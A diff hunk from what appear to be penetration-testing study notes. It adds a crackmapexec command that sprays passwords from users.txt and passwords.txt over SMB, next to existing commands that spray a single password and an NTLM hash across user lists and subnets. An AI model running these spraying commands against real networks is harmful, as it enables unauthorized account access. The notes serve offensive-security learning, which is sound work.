@@ -61,6 +61,9 @@ An important consideration is that a valid login is not immediately apparent wit
 ```shell-session
 sudo crackmapexec smb 172.16.5.5 -u valid_ad_users -p Password123 | grep +
 
+# Spray password with a user.txt and a password.txt
+crackmapexec smb 172.16.7.3 -u users.txt -p passwords.txt --continue-on-success --no-bruteforce
+
 # Spraying password with crackmapexec
 crackmapexec smb $ip/23 -u /folder/userlist.txt -u administrator -H 88ad09182de639ccc6579eb0849751cf --local-auth --continue-on-success | grep +
 # --continue-on-success:  continue spraying even after a valid password is found. Useful for spraying a single password against a large user list
